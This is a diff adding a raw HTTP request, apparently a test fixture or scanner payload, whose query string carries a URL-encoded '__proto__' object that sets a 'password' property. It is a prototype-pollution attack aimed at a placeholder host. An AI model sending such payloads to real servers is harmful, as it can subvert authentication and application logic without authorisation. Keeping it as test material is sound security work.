@@ -1,0 +1,4 @@
+GET /a?s={%26quot;__proto__%26quot;:{%26quot;password%26quot;:%26quot;x%26quot;}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
